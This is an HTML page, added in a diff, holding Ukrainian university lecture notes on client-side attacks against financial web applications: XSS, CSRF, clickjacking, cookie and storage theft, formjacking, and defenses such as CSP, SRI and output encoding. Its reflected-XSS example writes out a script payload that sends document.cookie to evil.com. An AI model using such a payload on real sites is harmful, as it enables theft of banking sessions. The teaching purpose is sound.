@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Конспект лекції 4: Клієнтські атаки — XSS, CSRF, Clickjacking у фінансових системах.">
+  <meta name="author" content="Кафедра ТЕІБ, Ужгородський національний університет">
+  <meta name="theme-color" content="#0ea5e9">
+  <title>Конспект: Лекція 4 — Фінансова Безпека</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css">
+  <script>if(localStorage.getItem('theme')==='dark')document.documentElement.classList.add('dark')</script>
+</head>
+<body>
+
+  <aside>
+    <div class="logo">
+      <div class="logo-icon">
+        <svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          <path d="M9 12l2 2 4-4"/>
+        </svg>
+      </div>
+      <div class="logo-text">
+        Фінансова<br>Безпека
+        <span>онлайн-курс</span>
+      </div>
+    </div>
+
+    <nav aria-label="Головна навігація">
+      <a href="../../index.html" class="active">
+        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H20v20H6.5a2.5 2.5 0 0 1 0-5H20"/></svg></span>
+        Лекції
+      </a>
+      <a href="../../practicals.html">
+        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></span>
+        Практичні
+      </a>
+      <a href="../../tests.html">
+        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></span>
+        Тести
+      </a>
+      <a href="../../materials.html">
+        <span class="nav-icon" aria-hidden="true"><svg viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z"/><path d="M14 2v4a2 2 0 0 0 2 2h4"/></svg></span>
+        Матеріали
+      </a>
+    </nav>
+
+    <div class="sidebar-footer">
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Перемкнути тему">
+        <svg id="theme-icon" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+        <span id="theme-label">Темна тема</span>
+      </button>
+    </div>
+  </aside>
+
+  <main>
+    <div class="lecture-nav-top">
+      <a href="../../lecture.html?id=4" class="back-link">&larr; Назад до лекції 4</a>
+      <span class="lecture-badge">Конспект лекції 4</span>
+    </div>
+
+    <article class="lecture-content">
+      <h1>Клієнтські атаки (XSS)</h1>
+      <div class="lecture-info">
+        <span>⏱ 2 год</span>
+        <span class="badge badge-new">Конспект</span>
+      </div>
+
+      <!-- Section 4.1 -->
+      <section>
+        <h2>4.1 Cross-Site Scripting (XSS)</h2>
+
+        <p>Cross-Site Scripting (XSS) — це тип вразливості, при якому зловмисник впроваджує шкідливий JavaScript-код у веб-сторінку, що виконується в браузері жертви. XSS стабільно входить до OWASP Top 10 і за даними HackerOne є найчастіше повідомлюваною вразливістю у bug bounty програмах. У фінансовому секторі наслідки XSS катастрофічні: крадіжка сесій інтернет-банкінгу, підміна реквізитів платежів, збір даних кредитних карток.</p>
+
+        <p><strong>Три типи XSS:</strong></p>
+
+        <p><strong>1. Reflected XSS (відображений)</strong> — шкідливий код передається через URL або параметри запиту та «відображається» у відповіді сервера без належної обробки. Жертва повинна перейти за спеціально сформованим посиланням.</p>
+        <ul>
+          <li>Приклад: пошук на сайті банку — користувач шукає <code>&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code>, і сервер вставляє цей рядок у сторінку результатів без екранування.</li>
+          <li>Фінансовий контекст: зловмисник надсилає клієнту банку фішинговий лист з посиланням на легітимний домен банку, але з XSS-payload у параметрі. Жертва бачить правильний домен і довіряє посиланню.</li>
+          <li>Вектор атаки: email-фішинг, месенджери, соціальні мережі, SMS з коротким посиланням.</li>
+        </ul>
+
+        <p><strong>2. Stored XSS (збережений)</strong> — найнебезпечніший тип. Шкідливий код зберігається на сервері (у базі даних, коментарях, профілях) та виконується у браузері кожного користувача, який переглядає заражену сторінку.</p>
+        <ul>
+          <li>Приклад у FinTech: зловмисник вставляє XSS-payload у поле «Призначення платежу» або «Ім'я отримувача». Коли оператор банку відкриває список транзакцій, скрипт виконується в його браузері з його привілеями.</li>
+          <li>Реальний кейс: у 2019 році Stored XSS в онлайн-банкінгу дозволяв зловмиснику, який створив рахунок з шкідливим ім'ям, виконувати JavaScript у панелі адміністратора банку при перегляді списку клієнтів.</li>
+          <li>Масштаб: одна вразливість може вразити тисячі користувачів без їхньої взаємодії.</li>
+        </ul>
+
+        <p><strong>3. DOM-based XSS</strong> — шкідливий код виконується виключно на стороні клієнта через маніпуляцію Document Object Model (DOM) без участі сервера. Вразливість знаходиться в клієнтському JavaScript-коді.</p>
+        <ul>
+          <li>Джерела (sources): <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>, <code>postMessage</code>.</li>
+          <li>Приймачі (sinks): <code>innerHTML</code>, <code>document.write()</code>, <code>eval()</code>, <code>setTimeout(string)</code>, <code>jQuery.html()</code>.</li>
+          <li>Особливість: payload не передається на сервер (наприклад, через fragment #), тому серверні WAF та фільтри не можуть його виявити.</li>
+          <li>Приклад у SPA-банкінгу: сучасні банківські додатки на React/Angular можуть бути вразливі через <code>dangerouslySetInnerHTML</code> або обхід Angular-санітайзера.</li>
+        </ul>
+
+        <p><strong>Контексти ін'єкції.</strong> Ефективний захист від XSS вимагає розуміння контексту, в який потрапляють дані: HTML body (потрібно HTML-encoding), HTML-атрибути (attribute encoding), JavaScript (JS encoding), URL (URL encoding), CSS (CSS encoding). Кожен контекст вимагає різного типу екранування — універсального захисту не існує.</p>
+      </section>
+
+      <!-- Section 4.2 -->
+      <section>
+        <h2>4.2 CSRF та Clickjacking</h2>
+
+        <p><strong>Cross-Site Request Forgery (CSRF)</strong> — атака, при якій зловмисник змушує браузер автентифікованого користувача надіслати небажаний запит до вразливого сайту. Браузер автоматично додає cookies (включаючи сесійні) до кожного запиту на домен, тому запит виглядає легітимним.</p>
+
+        <p><strong>Сценарій атаки на інтернет-банкінг:</strong></p>
+        <ol>
+          <li>Клієнт авторизований в інтернет-банкінгу (сесійний cookie активний).</li>
+          <li>Клієнт відвідує шкідливий сайт або відкриває email з HTML-вмістом.</li>
+          <li>Шкідлива сторінка містить приховану форму, яка автоматично надсилає POST-запит на <code>bank.com/transfer</code> з параметрами: recipient=attacker&amount=10000.</li>
+          <li>Браузер додає сесійний cookie банку до запиту. Банк бачить валідну сесію та виконує переказ.</li>
+        </ol>
+
+        <p><strong>Методи захисту від CSRF:</strong></p>
+        <ul>
+          <li><strong>CSRF Token (Synchronizer Token Pattern)</strong> — сервер генерує унікальний токен для кожної сесії або форми. Токен включається у приховане поле форми та перевіряється при отриманні запиту. Зловмисник не може отримати токен з іншого домену через Same-Origin Policy.</li>
+          <li><strong>SameSite Cookies</strong> — атрибут <code>SameSite=Strict</code> забороняє відправку cookie з cross-site запитів. <code>SameSite=Lax</code> — компроміс, що дозволяє cookie лише для top-level навігації (GET). Для фінансових систем рекомендується Strict.</li>
+          <li><strong>Double Submit Cookie</strong> — CSRF-токен зберігається в cookie та одночасно передається в тілі запиту або header. Сервер порівнює обидва значення.</li>
+          <li><strong>Custom Request Headers</strong> — AJAX-запити з кастомними headers (наприклад, X-Requested-With) не можуть бути надіслані cross-origin без CORS preflight, що блокує CSRF.</li>
+        </ul>
+
+        <p><strong>Clickjacking (UI Redressing)</strong> — атака, при якій зловмисник накладає прозорий iframe з легітимним сайтом поверх шкідливої сторінки. Користувач думає, що натискає кнопку на сайті зловмисника, а насправді клікає на кнопку «Підтвердити переказ» у прихованому iframe банку.</p>
+        <ul>
+          <li><strong>Приклад у FinTech:</strong> зловмисник створює сторінку «Виграйте iPhone» з кнопкою «Забрати приз». За цією кнопкою прихований iframe з відкритою сторінкою банку та кнопкою «Підтвердити переказ на 50 000 грн».</li>
+          <li><strong>Захист:</strong> HTTP-заголовок <code>X-Frame-Options: DENY</code> (або SAMEORIGIN) забороняє вбудовування сторінки в iframe. Сучасний підхід — директива <code>frame-ancestors</code> у Content Security Policy.</li>
+          <li><strong>Likejacking, Cursorjacking</strong> — варіації clickjacking для підміни дій у соціальних мережах та маніпуляції курсором.</li>
+        </ul>
+      </section>
+
+      <!-- Section 4.3 -->
+      <section>
+        <h2>4.3 Атаки на клієнтське сховище</h2>
+
+        <p>Сучасні веб-додатки зберігають значні обсяги даних на стороні клієнта: сесійні токени, JWT, персональні дані, кеш транзакцій. Кожен механізм зберігання має свої вразливості, які зловмисники активно експлуатують у фінансовому секторі.</p>
+
+        <p><strong>Крадіжка cookies:</strong></p>
+        <ul>
+          <li><strong>Через XSS:</strong> класичний вектор — <code>document.cookie</code> відправляється на сервер зловмисника. Захист: атрибут <code>HttpOnly</code> забороняє доступ до cookie через JavaScript.</li>
+          <li><strong>Через мережу:</strong> на незахищених HTTP-з'єднаннях cookies передаються у відкритому вигляді. Захист: атрибут <code>Secure</code> дозволяє передачу лише через HTTPS + HSTS (HTTP Strict Transport Security).</li>
+          <li><strong>Cookie Tossing:</strong> зловмисник встановлює cookie на батьківському домені, що перезаписує cookie піддомену. Актуально для банків з кількома піддоменами (online.bank.com, api.bank.com).</li>
+        </ul>
+
+        <p><strong>Проблеми localStorage та sessionStorage:</strong></p>
+        <ul>
+          <li>Доступні будь-якому JavaScript на сторінці — XSS дає повний доступ до всіх збережених даних.</li>
+          <li>Немає атрибуту HttpOnly або аналогу — неможливо обмежити доступ з JS.</li>
+          <li>localStorage зберігається безстроково, навіть після закриття браузера. JWT-токени у localStorage — це постійний ризик.</li>
+          <li><strong>Рекомендація для FinTech:</strong> зберігати access token у пам'яті (JavaScript-змінна), refresh token — у HttpOnly cookie. Не використовувати localStorage для чутливих даних.</li>
+        </ul>
+
+        <p><strong>Session Hijacking</strong> — перехоплення або крадіжка сесійного ідентифікатора для отримання доступу до акаунту жертви:</p>
+        <ul>
+          <li><strong>Session Sniffing</strong> — перехоплення session ID через незашифрований трафік (WiFi у кафе).</li>
+          <li><strong>Session Fixation</strong> — зловмисник встановлює відомий session ID жертві до автентифікації, а після логіну жертви використовує цей ID.</li>
+          <li><strong>Cross-Site Script Inclusion (XSSI)</strong> — викрадення даних з JSON-відповідей через тег <code>&lt;script&gt;</code>, якщо відповідь є валідним JavaScript.</li>
+        </ul>
+
+        <p><strong>Формджекінг (Formjacking)</strong> — ін'єкція шкідливого JavaScript у платіжні форми для крадіжки даних кредитних карток у реальному часі. Група Magecart здійснила серію масштабних атак: British Airways (380 000 карток), Ticketmaster, Newegg. Зловмисники компрометують або сам сайт, або сторонній JavaScript-скрипт (CDN, analytics, chat widget), який підключений до платіжної сторінки. Захист: Subresource Integrity (SRI), обмеження сторонніх скриптів через CSP, ізоляція платіжних сторінок.</p>
+      </section>
+
+      <!-- Section 4.4 -->
+      <section>
+        <h2>4.4 Захист від клієнтських атак</h2>
+
+        <p>Ефективний захист від клієнтських атак вимагає багаторівневого підходу (defense in depth): від правильного кодування виводу до суворих HTTP-заголовків безпеки та ізоляції критичних компонентів.</p>
+
+        <p><strong>Content Security Policy (CSP)</strong> — HTTP-заголовок, який вказує браузеру, звідки дозволено завантажувати ресурси. CSP є найпотужнішим інструментом захисту від XSS:</p>
+        <ul>
+          <li><strong>script-src</strong> — дозволяє виконання скриптів лише з визначених джерел. <code>script-src 'self'</code> дозволяє лише скрипти з того ж домену, блокуючи inline-скрипти та eval().</li>
+          <li><strong>style-src</strong> — контроль завантаження CSS. Забороняє inline styles, які можуть використовуватися для exfiltration через CSS injection.</li>
+          <li><strong>connect-src</strong> — обмежує домени для AJAX-запитів та WebSocket. Запобігає відправці вкрадених даних на зовнішні сервери.</li>
+          <li><strong>frame-ancestors</strong> — замінює X-Frame-Options, контролює вбудовування сторінки в iframe.</li>
+          <li><strong>report-uri / report-to</strong> — браузер надсилає звіти про порушення CSP, що дозволяє виявляти атаки та помилки в політиці.</li>
+          <li><strong>Strict CSP:</strong> замість whitelist доменів використовувати nonce-based (<code>script-src 'nonce-random123'</code>) або hash-based підхід. Whitelist легко обходиться через JSONP endpoints або Angular sandbox bypass на дозволених доменах.</li>
+        </ul>
+
+        <p><strong>Subresource Integrity (SRI)</strong> — атрибут integrity на тегах <code>&lt;script&gt;</code> та <code>&lt;link&gt;</code>, що містить криптографічний хеш очікуваного вмісту. Якщо CDN скомпрометовано і скрипт змінено (як у випадку Magecart), браузер відмовиться його виконувати, бо хеш не збігається.</p>
+
+        <p><strong>Output Encoding (екранування виводу)</strong> — основний захист від XSS. Кожен контекст вимагає свого типу encoding:</p>
+        <ul>
+          <li>HTML context: <code>&lt;</code> → <code>&amp;lt;</code>, <code>&gt;</code> → <code>&amp;gt;</code>, <code>&amp;</code> → <code>&amp;amp;</code></li>
+          <li>HTML attribute: додатково екрануються лапки та спеціальні символи</li>
+          <li>JavaScript context: Unicode-escape для спеціальних символів</li>
+          <li>URL context: percent-encoding для параметрів</li>
+          <li><strong>Правило:</strong> екранувати при виводі (output), а не при введенні (input). Дані зберігаються у чистому вигляді, а екрануються відповідно до контексту, де відображаються.</li>
+        </ul>
+
+        <p><strong>Trusted Types</strong> — сучасний браузерний API, який запобігає DOM-based XSS на рівні платформи. Trusted Types забороняють присвоєння рядків до небезпечних sinks (innerHTML, document.write) — дозволені лише «довірені» об'єкти, створені через явну санітизацію.</p>
+
+        <p><strong>Комплекс Secure Headers для фінансового додатку:</strong></p>
+        <ul>
+          <li><code>Content-Security-Policy</code> — захист від XSS та data injection</li>
+          <li><code>X-Content-Type-Options: nosniff</code> — запобігання MIME-sniffing</li>
+          <li><code>X-Frame-Options: DENY</code> — захист від clickjacking</li>
+          <li><code>Strict-Transport-Security</code> — примусовий HTTPS (HSTS)</li>
+          <li><code>Referrer-Policy: strict-origin-when-cross-origin</code> — контроль витоку URL</li>
+          <li><code>Permissions-Policy</code> — обмеження доступу до API браузера (camera, microphone, geolocation)</li>
+        </ul>
+      </section>
+
+      <!-- Summary -->
+      <section>
+        <h2>Підсумок</h2>
+        <p>У цій лекції ми детально розглянули клієнтські атаки на фінансові веб-додатки. XSS у всіх його формах (Reflected, Stored, DOM-based) залишається однією з найпоширеніших і найнебезпечніших вразливостей — у фінансовому контексті це пряма загроза грошам клієнтів. CSRF дозволяє виконувати несанкціоновані транзакції від імені жертви, а Clickjacking маскує критичні дії під нешкідливі кліки.</p>
+        <p>Атаки на клієнтське сховище та формджекінг демонструють, чому правильне управління токенами та ізоляція платіжних форм є критичними. Сучасний стек захисту — CSP, SRI, Trusted Types, secure headers та правильне output encoding — забезпечує багаторівневий захист від усього спектру клієнтських атак.</p>
+        <p><strong>У наступній лекції</strong> ми розглянемо серверні вразливості та безпеку баз даних: SQL-ін'єкції, SSRF, XXE та методи захисту критичних даних фінансових систем.</p>
+      </section>
+    </article>
+
+    <div class="lecture-nav-bottom">
+      <a href="../../lecture.html?id=4" class="nav-btn">&larr; Назад до лекції</a>
+      <span></span>
+    </div>
+
+    <footer></footer>
+  </main>
+
+  <script src="../../js/main.js"></script>
+
+</body>
+</html>
